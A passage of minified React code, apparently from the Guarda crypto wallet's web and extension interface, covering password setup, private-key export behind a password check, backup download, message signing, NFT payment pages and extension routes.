            }, "Staking balance"), O.createElement(tooltip, {
                classNameWrapper: Ht()(zae),
                text: "Total staked value of all your wallets",
                width: "300px"
            }, O.createElement("img", {
                src: Aae,
                width: 16,
                height: 16,
                alt: "svg tooltip"
            }))), O.createElement("div", {
                className: Ht()(Dee, Hae)
            }, "$ 0.00")))), O.createElement(PieChart_PieChart, {
                data: Gae
            })), O.createElement(MoreInfoBanner_MoreInfoBanner, {
                isVisible: t,
                onClose: () => a(!1)
            }))
        }
          , Zae = "main-page_topBlock_26cim"
          , Yae = "main-page_bottomBlock_10Q-2"
          , EarnMainPage_EarnMainPage = () => {
            const e = getIsAvailableOnStageWithDevMode();
            return O.createElement("div", null, e && O.createElement("div", {
                className: "col-xs-8 electron-left-column-new"
            }, O.createElement("div", {
                className: Ht()(X5.borrowBorderContainer, Zae)
            }, O.createElement(TotalAmountBlock_TotalAmountBlock, null))), e && O.createElement("div", {
                className: "col-xs-4"
            }, O.createElement("div", {
                className: Ht()(X5.borrowBorderContainer, Zae)
            }, O.createElement(CardsBlock, null))), O.createElement("div", {
                className: "col-xs-12 "
            }, O.createElement("div", {
                className: Ht()(X5.borrowBorderContainer, Yae)
            }, O.createElement(StakingBlock_StakingBlock, null))))
        }
          , EarnRouter = () => {
            const e = (0,
            $.v9)(oe.Yq)
              , t = (0,
            $.v9)(oe.Oj);
            return O.createElement(j.rs, null, !e && O.createElement(j.AW, {
                exact: !0,
                path: "/app/earn",
                component: WelcomeRoot
            }), e && !t && O.createElement(j.AW, {
                path: "/app/earn",
                component: EnterPasswordPage
            }), O.createElement(j.AW, {
                path: "/app/earn",
                component: EarnMainPage_EarnMainPage
            }), O.createElement(j.AW, {
                component: _404
            }))
        }
          , EarnPage_EarnPage = () => O.createElement("div", {
            className: Ht()(p5)
        }, O.createElement(HeaderWallets, null), O.createElement("div", {
            className: f5
        }, O.createElement(sb, null, O.createElement("div", {
            className: "container"
        }, O.createElement("div", {
            className: "row"
        }, O.createElement(EarnRouter, null))))), O.createElement(Footer_Footer, null))
          , qae = "proceed_loader_5IFZw"
          , Xae = "proceed_center_1v8QK";
        function AppPagePayment() {
            const e = (0,
            $.v9)($c)
              , t = (0,
            j.k6)()
              , redirectByParams = a => {
                const n = stringToObject(a)
                  , {method: r} = n;
                if ("sign" !== r)
                    if ("paymentKitty" !== r) {
                        if ("payment" === r) {
                            const a = {};
                            Object.assign(a, {
                                addressFrom: n.addressFrom || "",
                                currencyFrom: n.currencyFrom || ""
                            });
                            if (!n.addressFrom) {
                                let t = e.find((e => {
                                    const t = e.currency === n.currencyTo;
                                    return n.amount ? t && (0,
                                    Ko.eg)(e.balance, n.amount) : t
                                }
                                ));
                                t || (t = e.find((e => e.currency === n.currencyTo)));
                                t && Object.assign(a, {
                                    addressFrom: t.address,
                                    currencyFrom: t.currency
                                })
                            }
                            t.replace({
                                pathname: "/app/extension/send",
                                search: objectToString({
                                    addressTo: n.addressTo || "",
                                    currencyTo: n.currencyTo || "",
                                    currencyFrom: n.currencyTo || "",
                                    amount: n.amount || "",
                                    extraId: n.extraId || "",
                                    ...a
                                })
                            })
                        }
                    } else
                        t.replace({
                            pathname: "/app/extension/payment",
                            search: objectToString(n)
                        });
                else
                    t.replace({
                        pathname: "/app/extension/sign",
                        search: objectToString(n)
                    })
            }
            ;
            (0,
            O.useEffect)(( () => {
                const handleMessage = e => {
                    if (e.origin.startsWith("chrome-extension://") && e.data && "send_params" === e.data.type) {
                        window.removeEventListener("message", handleMessage);
                        ext_message({
                            type: "send_params_received"
                        });
                        redirectByParams(e.data.search)
                    }
                }
                ;
                window.addEventListener("message", handleMessage);
                return () => {
                    window.removeEventListener("message", handleMessage)
                }
            }
            ), []);
            return O.createElement("div", {
                className: Xae
            }, O.createElement("div", null, O.createElement("div", null, "Redirecting"), " ", O.createElement(LoaderDots, {
                visible: !0
            })))
        }
        function enter_password_AppPageEnterPassword() {
            const e = (0,
            $.I0)()
              , t = (0,
            j.k6)()
              , a = (0,
            $.v9)(eu)
              , handleEnter = async n => {
                const r = await e(getSecureData($e));
                let l = null;
                r && (l = a(r.data ? r.data.uuid : r.uuid));
                const s = n.map((e => {
                    let {address: t, currency: a, balance: n} = e;
                    return {
                        address: t,
                        currency: a,
                        balance: n
                    }
                }
                ));
                ext_message({
                    type: "unlocked",
                    wallets: s,
                    defaultWallet: l ? {
                        address: l.address,
                        balance: l.balance,
                        currency: l.currency
                    } : null
                });
                if (!r) {
                    t.replace((0,
                    M.RU)("/settings"));
                    throw new Error
                }
            }
            ;
            return O.createElement(AppPageEnterPassword, {
                onEnter: handleEnter
            })
        }
        function set_password_AppPageSetPassword() {
            const e = (0,
            $.v9)($c)
              , t = (0,
            $.I0)()
              , a = (0,
            j.k6)()
              , [n,r] = (0,
            O.useState)(!1)
              , [l,s] = (0,
            O.useState)("")
              , i = (0,
            $.v9)(Vc);
            (0,
            O.useEffect)(( () => {
                e.length || a.replace((0,
                M.RU)())
            }
            ), []);
            const handleStart = async e => {
                s(e);
                r(!0)
            }
              , handleDownloadAndContinue = async () => {
                const n = {
                    password: l,
                    data: {
                        uuid: Bf()(e.reduce(( (e, t) => e + t.address), "")).toString(),
                        wallets: e.map((e => e.mapToPlainObject()))
                    }
                };
                if (i) {
                    const e = await generateBackupIdFromMnemonic(i);
                    Object.assign(n, {
                        ...n,
                        data: {
                            mnemonic: i,
                            ...n.data,
                            uuid: e,
                            [Ze]: 62
                        }
                    })
                }
                t(ie.replaceStorage(n));
                t(ie.setMasterPassword({
                    masterPassword: l
                }));
                if (i) {
                    cc.$.send(cc.d.WALLETS_IMPORT_BY_MNEMONIC);
                    r(!0)
                }
                t(handleDownload(Sm.FORCE));
                t(removeNotifyBackup());
                t(rd.setWalletsMnemonic(""));
                a.replace((0,
                M.RU)())
            }
            ;
            return O.createElement("div", {
                className: "container"
            }, O.createElement("div", {
                className: "row"
            }, O.createElement("div", null, n ? O.createElement(O.Fragment, null, O.createElement(white_block, {
                className: Fq
            }, O.createElement("h3", null, "Backup is the key to your funds"), O.createElement("p", null, "Please save your backup file and keep it properly as well as password. It ensures access to your funds."), O.createElement("ul", null, O.createElement("li", null, O.createElement("span", null, "Access to the wallet is possible only using both password and backup file.")), O.createElement("li", null, O.createElement("span", null, "Guarda does not keep nor able to restore your backup and password. Only you have access to your wallet.")), O.createElement("li", null, O.createElement("span", null, "Never share it with anyone."))), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleDownloadAndContinue,
                className: Bq,
                id: "creationDownloadBackup"
            }, "Download Backup"))) : O.createElement(SetPasswordComponent, {
                onSetPassword: handleStart
            }))))
        }
        const Qae = {
            wrapperForm: "settings_wrapperForm_1_0aV app_wrapperBlock_2EpA3",
            suppotLink: "settings_suppotLink_YDtgo",
            note: "settings_note_eOf_P",
            wrapperFiled: "settings_wrapperFiled_132Dd",
            wrapperSelect: "settings_wrapperSelect_1QyF6",
            failedMessage: "settings_failedMessage_3C13a",
            savedMessage: "settings_savedMessage_3nw8e",
            visibleMessage: "settings_visibleMessage_1Pt9h",
            wrapperSelectPrivateKeys: "settings_wrapperSelectPrivateKeys_TPMaO",
            separator: "settings_separator_3Gy5N",
            wrapperPrivateKey: "settings_wrapperPrivateKey_3hWb0",
            textarea: "settings_textarea_3BlnY textarea_textarea_3EjI7",
            buttonCopy: "settings_buttonCopy_2LMB5 styles_dashedNormal_xEvl8",
            footerButtons: "settings_footerButtons_1IA2G",
            centerPopupQr: "settings_centerPopupQr_qwpXV"
        }
          , default_wallet = () => {
            const e = (0,
            $.I0)()
              , [t,a] = (0,
            O.useState)(null)
              , [n,r] = (0,
            O.useState)(!1)
              , [l,s] = (0,
            O.useState)(!1)
              , i = O.createRef()
              , o = (0,
            $.v9)($c)
              , c = (0,
            $.v9)(eu);
            (0,
            O.useEffect)(( () => {
                async function fetch() {
                    const t = await e(getSecureData($e));
                    if (!t)
                        return;
                    const n = t.data ? t.data.uuid : t.uuid
                      , r = t ? c(n) : null;
                    r && a(r)
                }
                o.length && fetch()
            }
            ), [o]);
            (0,
            O.useEffect)(( () => {
                r(!1)
            }
            ), [t]);
            const u = o.filter((e => {
                let {currency: t} = e;
                return "eth" === t
            }
            ))
              , handlePreSelectWallet = e => {
                a(e)
            }
            ;
            let d = null;
            const handleApply = () => {
                const {isValid: a} = i.current.validate();
                if (!a) {
                    r(!0);
                    return
                }
                const n = o.map((e => {
                    let {address: t, currency: a, balance: n} = e;
                    return {
                        address: t,
                        currency: a,
                        balance: n
                    }
                }
                ));
                e(setSecureData($e, t.mapToPlainObject()));
                ext_message({
                    type: "unlocked",
                    wallets: n,
                    defaultWallet: {
                        address: t.address,
                        balance: t.balance,
                        currency: t.currency
                    }
                });
                s(!0);
                clearTimeout(d);
                d = setTimeout(( () => s(!1)), 2e3)
            }
            ;
            return O.createElement(sf(), {
                ref: i
            }, O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: t
            }, (e => {
                let {isValid: a, message: r} = e;
                return O.createElement("div", {
                    className: Qae.wrapperFiled
                }, O.createElement("div", {
                    className: Qae.wrapperSelect
                }, O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !a && n,
                    message: r
                }, O.createElement(Mh, {
                    selectedWallet: t,
                    wallets: u,
                    onChange: handlePreSelectWallet,
                    withoutWatchOnly: !0
                }))), O.createElement(Yl, {
                    size: "big",
                    color: "blue",
                    onClick: handleApply
                }, "Apply"), O.createElement("div", {
                    className: Ht()(Qae.savedMessage, {
                        [Qae.visibleMessage]: l
                    })
                }, "Default wallet succeseful saved"))
            }
            )))
        }
          , Jae = "private-keys_wrapper_3p6mw app_wrapperBlock_2EpA3"
          , ene = "private-keys_wrapperForm_31K6I app_wrapperCenterBlockBackup_1twFL"
          , tne = "private-keys_privateKeyBlock_3EUZi"
          , ane = "private-keys_buttonAction_HiXjx styles_dashedNormal_xEvl8"
          , nne = "private-keys_iconQRCode_YITmG"
          , rne = "private-keys_subWallet_2_xbs"
          , lne = "private-keys_walletBlock_1Kea2"
          , sne = "private-keys_wallet_1EUkn"
          , ine = "private-keys_walletInfo_3HT1p"
          , one = "private-keys_wrapperCurrency_97u5l"
          , cne = "private-keys_ticker_2m_x4"
          , une = "private-keys_subWalletsIcons_nvq43"
          , dne = "private-keys_wrapperInformation_LQTsO"
          , mne = "private-keys_block_2ujAV"
          , pne = "private-keys_arrowToggle_1tcUW"
          , fne = "private-keys_extendPrivateKey_2KlY5"
          , Ene = "private-keys_inputSearch_IcyBK"
          , hne = "private-keys_inputSearchBorder_23qOa"
          , gne = "private-keys_coins_3I_Dn"
          , yne = "private-keys_fastDeleteWallet_2tfDU"
          , vne = "private-keys_warning_8lMAL"
          , prepareName = e => "viewKey" === e ? "View Key" : "spendKey" === e ? "Spend Key" : "mnemonic" === e ? "Mnemonic" : "privateKey" === e ? "Private Key" : e
          , private_key_render = e => {
            let {wallet: t, onClickQr: a} = e;
            return "string" == typeof t.privateKey ? O.createElement(O.Fragment, null, O.createElement("h4", null, O.createElement("span", null, "Private Key:"), t.privateKey && O.createElement(O.Fragment, null, " ", O.createElement(button_copy, {
                text: t.privateKey,
                className: ane
            }), a && O.createElement("img", {
                src: Nf,
                alt: "",
                className: nne,
                onClick: () => a(t.privateKey)
            }))), O.createElement("p", null, t.privateKey), O.createElement("div", {
                className: vne
            }, "Private key provides access to your funds. Keep it confidential and do not share with anyone, including Guarda team.")) : O.createElement(O.Fragment, null, Object.keys(t.privateKey || {}).map((e => O.createElement("div", {
                className: fne,
                key: `privateKeyObject${e}${t.currency}${t.address}`
            }, O.createElement("span", null, prepareName(e), ":"), O.createElement("p", null, t.privateKey[e], " ", O.createElement(button_copy, {
                text: t.privateKey[e],
                className: ane
            }), a && O.createElement("img", {
                src: Nf,
                alt: "",
                className: nne,
                onClick: () => a(t.privateKey[e])
            }))))), O.createElement("div", {
                className: vne
            }, "Private key provides access to your funds. Keep it confidential and do not share with anyone, including Guarda team."))
        }
          , private_keys = () => {
            const e = (0,
            $.I0)()
              , [t,a] = (0,
            O.useState)(null)
              , [n,r] = (0,
            O.useState)(!1)
              , [l,s] = (0,
            O.useState)(!1)
              , [i,o] = (0,
            O.useState)("")
              , [c,u] = (0,
            O.useState)(!1)
              , d = O.createRef()
              , handleChangeWallet = e => {
                a(e)
            }
              , focus = () => {
                d.current && d.current.focus()
            }
              , handleShow = () => {
                if (!t)
                    return;
                const a = e(checkMasterPassword(i));
                o("");
                if (a)
                    r(!0);
                else {
                    s(!0);
                    setTimeout(( () => s(!1)), 2e3);
                    focus()
                }
            }
            ;
            (0,
            O.useEffect)(( () => {
                if (t) {
                    focus();
                    r(!1)
                }
            }
            ), [t]);
            const m = (0,
            $.v9)($c);
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: Qae.wrapperFiled
            }, O.createElement("div", {
                className: Qae.wrapperSelectPrivateKeys
            }, O.createElement(Mh, {
                selectedWallet: null != t ? t : void 0,
                wallets: m,
                onChange: handleChangeWallet,
                withoutWatchOnly: !0
            }))), O.createElement(aa, {
                visible: Boolean(c),
                width: 320,
                onClose: () => u(null)
            }, O.createElement("div", {
                className: Qae.centerPopupQr
            }, O.createElement(qr_code, {
                size: 150,
                value: c || ""
            }))), !n && O.createElement("div", {
                className: Qae.wrapperFiled
            }, O.createElement("div", {
                className: Qae.wrapperSelect
            }, O.createElement(Ea, {
                ref: d,
                value: i,
                type: "password",
                onEnter: handleShow,
                onChange: e => {
                    let {target: {value: t}} = e;
                    return o(t)
                }
                ,
                placeholder: "Password",
                autoComplete: "off",
                disabled: !t
            })), O.createElement("div", {
                className: Ht()(Qae.failedMessage, {
                    [Qae.visibleMessage]: l
                })
            }, "Password is invalid"), O.createElement(Yl, {
                size: "big",
                color: "blue",
                onClick: handleShow
            }, "Show")), t && n && O.createElement("div", {
                className: Qae.wrapperPrivateKey
            }, O.createElement(private_key_render, {
                wallet: t,
                onClickQr: u
            })))
        }
          , backup_code = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(oe.gX);
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: Qae.textarea
            }, t), O.createElement("div", {
                className: Qae.footerButtons
            }, O.createElement(Yl, {
                color: "blue",
                onClick: () => e(handleDownload(Sm.FORCE))
            }, "Download"), O.createElement(button_copy, {
                className: Qae.buttonCopy,
                text: t
            })))
        }
          , settings_SettingsPage = () => {
            const e = (0,
            $.I0)()
              , handleLogout = () => {
                (0,
                M.tq)() || ext_message({
                    type: "locked"
                });
                e(doLogout())
            }
            ;
            return O.createElement(O.Fragment, null, O.createElement(DashboardMenu, null), O.createElement("div", {
                className: Qae.wrapperForm
            }, !(0,
            M.tq)() && O.createElement(O.Fragment, null, O.createElement(label, null, "Default wallet", O.createElement(LabelAction, null, O.createElement("a", {
                className: Qae.suppotLink,
                href: "https://support.guarda.com",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "Support", O.createElement("img", {
                src: Bp,
                alt: ""
            })))), O.createElement("p", {
                className: Qae.note
            }, "All your assets are stored on this address.", O.createElement("br", null), "Here you can choose and switch the address you want to use for the current operations with assets."), O.createElement(default_wallet, null)), O.createElement("div", {
                className: Qae.separator
            }), O.createElement(label, null, "Private keys"), O.createElement("p", {
                className: Qae.note
            }, "Here you can export your Private Key from Guarda to use it in any other wallet. Please keep in mind that Guarda cannot ensure your security in another wallet exсept Guarda."), O.createElement(private_keys, null), O.createElement("div", {
                className: Qae.separator
            }), O.createElement(label, null, "Backup Code"), O.createElement("p", {
                className: Qae.note
            }, "Guarda Wallet Backup includes all crypto-currencies from your multi-currency Wallet. You can either copy the string of symbols manually, or click the Download button to get it."), O.createElement(backup_code, null), O.createElement("div", {
                className: Qae.separator
            }), (0,
            M.tq)() && O.createElement(O.Fragment, null, O.createElement(label, null, "View settings"), O.createElement("p", {
                className: Qae.note
            }, "Fullscreen version available - ", O.createElement("a", {
                href: "/app?fullWebVersion=1"
            }, "Switch to web interface"))), O.createElement("div", {
                className: Qae.separator
            }), !(0,
            M.tq)() && O.createElement(ui_message, {
                type: "error"
            }, "Attention!", O.createElement("br", null), "You will log out of all your dApp accounts you entered using Guarda extension. To log out of Guarda Wallet only just leave or refresh the extension."), O.createElement("div", {
                className: Qae.buttonWrapper
            }, O.createElement(Yl, {
                color: "red",
                onClick: handleLogout
            }, "Logout"))))
        }
          , _ne = settings_SettingsPage
          , wne = "sign_wrapperForm_3GUdw app_wrapperLeftBlock_3QLZp"
          , bne = "sign_buttons_DMR-S"
          , kne = "sign_cancel_M9P2x"
          , AppPageSign = e => {
            let {location: t} = e;
            const a = stringToObject(t.search)
              , n = (0,
            $.v9)(au)
              , [r,l] = (0,
            O.useState)(null);
            (0,
            O.useEffect)(( () => {
                async function fetch() {
                    const e = await Se.Z.getApiByCurrency("eth");
                    l(e)
                }
                fetch()
            }
            ), []);
            const getMessageForSign = () => r ? r.convertDataToStringForSign(a.data || "") : "Wait..."
              , handleClose = () => {
                try {
                    window.parent.close()
                } catch (e) {}
            }
              , s = n(a.addressTo, "eth")
              , handleSign = () => {
                const e = r.signMessage({
                    data: a.data,
                    privateKey: s.privateKey
                });
                ext_message({
                    type: "sign",
                    sign: e.signature
                });
                setTimeout(handleClose, 500)
            }
            ;
            return O.createElement(O.Fragment, null, O.createElement(DashboardMenu, null), O.createElement("div", {
                className: wne
            }, O.createElement(label, null, "Sign"), O.createElement("p", null, "Please sign that message:"), O.createElement(ui_message, null, getMessageForSign())), O.createElement("div", {
                className: bne
            }, O.createElement("div", {
                className: kne,
                onClick: handleClose
            }, "Cancel"), O.createElement(Yl, {
                color: "blue",
                onClick: handleSign
            }, "Sign")))
        }
        ;
        AppPageSign.propTypes = {
            location: as().object.isRequired
        };
        const Sne = (0,
        j.EN)(AppPageSign)
          , parse_contract_data = e => {
            const t = e.slice(0, 10)
              , a = undefined
              , n = e.slice(10).match(/.{1,64}/g);
            n.forEach(( (e, t) => {
                n[t] = `0x${e}`
            }
            ));
            return {
                method: t,
                args: n
            }
        }
          , hexToNumber = e => {
            if (e.startsWith("0x"))
                try {
                    return String(parseInt(e, 16))
                } catch (e) {
                    return ""
                }
            return ""
        }
          , Cne = undefined
          , Nne = {
            CRYPTOKITTIES: {
                name: "CRYPTOKITTIES",
                contracts: [{
                    name: "CryptoKitties_Core",
                    address: "0x06012c8cf97BEaD5deAe237070F9587f8E7A266d",
                    methods: {}
                }, {
                    name: "CryptoKitties_SalesAuction",
                    address: "0xb1690c08e213a35ed9bab7b318de14420fb57d8c",
                    methods: {
                        bid: "0x454a2ab3"
                    }
                }],
                pic: {
                    picUrl: "https://img.cryptokitties.co/{address}/{id}.svg",
                    buildPicUrl: async (e, t) => {
                        const a = parse_contract_data(t)
                          , n = Nne.CRYPTOKITTIES
                          , r = n.contracts[0]
                          , l = n.contracts[1];
                        return a.method === l.methods.bid && a.args[0] ? n.pic.picUrl.replace("{address}", r.address.toLowerCase()).replace("{id}", hexToNumber(a.args[0])) : null
                    }
                }
            },
            PLAY_0X_UNIVERSE: {
                name: "PLAY_0X_UNIVERSE",
                contracts: [{
                    name: "0xUniverse_Contract3",
                    address: "0xe658e6eb4b478da2cf36d9e3712ba0c1b33786a1",
                    methods: {
                        bid: "0x454a2ab3"
                    }
                }],
                pic: {
                    picUrl: a.p + "7b80fb3d9da2f028ca7d875be1d850ba.svg",
                    buildPicUrl: async (e, t) => {
                        const a = parse_contract_data(t)
                          , n = Nne.PLAY_0X_UNIVERSE
                          , r = n.contracts[0];
                        return a.method === r.methods.bid && a.args[0] ? n.pic.picUrl : null
                    }
                }
            },
            BLOCKCHAINBEAUTIES: {
                name: "BLOCKCHAINBEAUTIES",
                contracts: [{
                    name: "BlockchainCuties",
                    address: "0xd73be539d6b2076bab83ca6ba62dfe189abc6bbe",
                    methods: {}
                }, {
                    name: "BlockchainCuties_Market",
                    address: "0xca891ae246e7177aad7b50dfb1b5e9993a63eafe",
                    methods: {
                        bid: "0xc170fd54"
                    }
                }],
                pic: {
                    picUrl: "https://blockchaincuties.com/rest/svga/5/{id}.svg",
                    buildPicUrl: async (e, t) => {
                        const a = parse_contract_data(t)
                          , n = Nne.BLOCKCHAINBEAUTIES
                          , r = n.contracts[1];
                        return a.method === r.methods.bid && a.args[0] ? n.pic.picUrl.replace("{id}", hexToNumber(a.args[0])) : null
                    }
                }
            },
            GODS_UNCHAINED: {
                name: "BLOCKCHAINBEAUTIES",
                contracts: [{
                    name: "RARE",
                    address: "0x0777f76d195795268388789343068e4fcd286919",
                    pic: "https://godsunchained.com/assets/images/cardpacks/rare-center.png",
                    methods: {}
                }, {
                    name: "EPIC",
                    address: "0x482cf6a9d6b23452c81d4d0f0f139c1414963f89",
                    pic: "https://godsunchained.com/assets/images/cardpacks/epic-center.png",
                    methods: {}
                }, {
                    name: "LEGENDARY",
                    address: "0xc47d7d42e44b2e04c83a45cf45898e597a0c2311",
                    pic: "https://godsunchained.com/assets/images/cardpacks/legendary-center.png",
                    methods: {}
                }, {
                    name: "SHINY_LEGENDARY",
                    address: "0x1e891c587b345ab02a31b57c1f926fb08913d10d",
                    pic: "https://godsunchained.com/assets/images/cardpacks/shiny-legendary-center.png",
                    methods: {}
                }],
                pic: {
                    buildPicUrl: e => {
                        const t = Nne.GODS_UNCHAINED.contracts.find((t => t.address === e));
                        return t ? t.pic : null
                    }
                }
            }
        };
        class ContractPicBuilder {
            static getERC721ObjectPicUrl(e) {
                const {data: t, addressTo: a} = e
                  , n = ContractPicBuilder.getResourceByAddress(a);
                return n ? n.pic.buildPicUrl(a, t) : null
            }
            static getResourceByAddress(e) {
                let t = null;
                Object.keys(Nne).forEach((a => {
                    if (t)
                        return;
                    const n = undefined;
                    Nne[a].contracts.find((t => t.address === e)) && (t = Nne[a])
                }
                ));
                return t
            }
        }
        const Tne = "payment_wrapperForm_2osFn app_wrapperLeftBlock_3QLZp"
          , Ane = "payment_buttons_u_svO"
          , xne = "payment_cancel_pujP2"
          , Ine = "payment_infoLabel_1tqg3"
          , Pne = "payment_loader_1RPUk"
          , Lne = "payment_purchaseImgWrapper_7aP0_"
          , Fne = "payment_itemPic_2VIHs"
          , Wne = "payment_center_3mB98"
          , Rne = "payment_error_2PyAD";
        function payment_AppPagePayment() {
            const e = useLocationSearch()
              , [t,a] = (0,
            O.useState)(!1)
              , [n,r] = (0,
            O.useState)(null)
              , [l,s] = (0,
            O.useState)(null)
              , [i,o] = (0,
            O.useState)(0)
              , [c,u] = (0,
            O.useState)(null)
              , [d,m] = (0,
            O.useState)(!0)
              , [p,f] = (0,
            O.useState)(0)
              , [E,h] = (0,
            O.useState)(!1)
              , g = (0,
            j.k6)()
              , y = undefined
              , v = (0,
            $.v9)(au)(e.addressFrom, "eth")
              , handleClose = () => {
                try {
                    window.parent.close()
                } catch (e) {}
            }
            ;
            (0,
            O.useEffect)(( () => {
                async function start() {
                    const t = await Se.Z.getApiByCurrency("eth")
                      , a = await ContractPicBuilder.getERC721ObjectPicUrl({
                        data: e.data,
                        addressTo: e.addressTo
                    });
                    u(t);
                    s(a)
                }
                start()
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                async function process() {
                    try {
                        if (c) {
                            const t = await c.calculateDataAmount({
                                addressTo: e.addressTo,
                                data: e.data,
                                gasPrice: e.gasPrice,
                                value: e.value,
                                gas: e.gasLimit,
                                wallet: v
                            });
                            r(t.gasLimit);
                            o(t.amount ? (0,
                            Ko.FH)(t.amount, {
                                max: 6
                            }) : 0);
                            f(t.fee ? (0,
                            Ko.FH)(t.fee, {
                                max: 6
                            }) : 0);
                            m(!1)
                        }
                    } catch (e) {
                        h(!0)
                    }
                }
                process()
            }
            ), [c]);
            const handleSign = async () => {
                a(!0);
                try {
                    const t = await c.sendCommonTransaction({
                        data: e.data,
                        gasPrice: e.gasPrice,
                        value: e.value,
                        addressTo: e.addressTo,
                        gasLimit: String(n),
                        currencyFrom: v.currency,
                        wallet: v
                    });
                    if (null != t && t.error)
                        throw new Error(t.error);
                    ext_message({
                        type: "hash",
                        hash: t
                    });
                    g.replace(`/app/extension/payment/status?hash=${t}&currency=${v.currency}&family=${v.family}`)
                } catch (e) {
                    h(!0)
                }
                a(!1)
            }
              , _ = v && v.currency ? v.currency : null
              , w = O.createElement("div", {
                className: Wne
            }, O.createElement("div", null, O.createElement("p", null, "Calculating fee"), " ", O.createElement(LoaderDots, {
                visible: !0
            })))
              , b = O.createElement("div", null, O.createElement(label, null, "From"), O.createElement(Mh, {
                wallets: [],
                disabled: !0,
                selectedWallet: v
            }), l && O.createElement("div", null, O.createElement(label, null, "You want to purchase: "), O.createElement("div", {
                className: Lne
            }, O.createElement("img", {
                className: Fne,
                alt: "",
                src: l
            }))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Amount: "), O.createElement(MiskInfoValue, null, "~ ", i, " ", (0,
            be.xG)(_))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Fee: "), O.createElement(MiskInfoValue, null, "~ ", p, " ", (0,
            be.xG)(_))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Total: "), O.createElement(MiskInfoValue, null, "~ ", (0,
            Ko.PD)(i, p).toString(), " ", (0,
            be.xG)(_))));
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: Tne
            }, d && !E ? w : b, O.createElement("div", {
                className: Ane
            }, t && O.createElement(LoaderDots, {
                visible: !0
            }), !t && E && O.createElement("div", {
                className: Rne
            }, "Something went wrong. Please try again later."), !t && !E && O.createElement("div", {
                className: xne,
                onClick: handleClose
            }, "Cancel"), O.createElement(Yl, {
                color: "blue",
                onClick: handleSign
            }, "Confirm"))))
        }
        const Bne = "payment-status_wrapper_2lHvX app_wrapperBlock_2EpA3"
          , One = "payment-status_wrapperForm_KbZxT app_wrapperCenterBlock_bcslh"
          , Dne = "payment-status_successTitle_iCQGY"
          , Mne = "payment-status_wrapperCenter_2cGYp"
          , Une = "payment-status_hash_1Es8S"
          , Gne = "payment-status_buttons_tnn7f"
          , Vne = "payment-status_cancel_z2iMd"
          , Kne = a.p + "6bdd5529fc84450cee184bc8242e3558.svg"
          , PagePaymentStatus = e => {
            let {location: t} = e;
            const a = stringToObject(t.search);
            a.family && "undefined" === a.family && (a.family = null);
            const {hash: n} = a
              , r = (0,
            be.Kb)(a.family, a.currency, a.hash)
              , handleClose = () => {
                try {
                    window.parent.close()
                } catch (e) {}
            }
            ;
            return O.createElement("div", {
                className: Bne
            }, O.createElement(DashboardMenu, null), O.createElement("div", {
                className: One
            }, O.createElement("div", {
                className: Mne
            }, O.createElement("img", {
                src: Kne,
                alt: ""
            }), O.createElement("h3", {
                className: Dne
            }, "Payment successfully proceeded!"), O.createElement("p", {
                className: Une
            }, "Hash: ", O.createElement("a", {
                href: r,
                target: "_blank",
                rel: "noreferrer noopener"
            }, formatAddress(n, 10))))), O.createElement("div", {
                className: Gne
            }, O.createElement("div", {
                className: Vne,
                onClick: handleClose
            }, "Close")))
        }
        ;
        PagePaymentStatus.propTypes = {
            location: as().object
        };
        PagePaymentStatus.propTypes = {
            location: as().object
        };
        const Hne = (0,
        j.EN)(PagePaymentStatus);
        function extension_board_extends() {
            extension_board_extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return extension_board_extends.apply(this, arguments)
        }
        const extension_board = () => O.createElement(j.rs, null, O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension",
            component: History_History
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/receive"
        }, O.createElement(DashboardMenu, null), O.createElement(DashboardWallets, null)), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/send",
            component: BoardSendPage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/send/confirm",
            component: PM
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/send/success",
            component: BoardSendSuccess
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/exchange",
            component: ExchangeMainPage_ExchangeMainPage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/exchange/details",
            component: ExchangeDetailsPage_ExchangeDetailsPage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/history",
            component: History_History
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/settings",
            component: _ne
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/sign",
            component: Sne
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/payment",
            component: payment_AppPagePayment
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/payment/status",
            component: Hne
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-clo",
            component: yZ
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-clo/staking",
            component: yZ
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-clo/staking/confirm",
            component: StakingCloConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-xtz",
            component: StakingXtzIndex
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-xtz/staking",
            component: StakingXtzIndex
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-xtz/staking/confirm",
            component: XtzStakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-bnb",
            component: OG
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-bnb/staking",
            component: OG
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/extension/staking-bnb/staking/confirm",
            component: MG
        }), O.createElement(j.AW, {
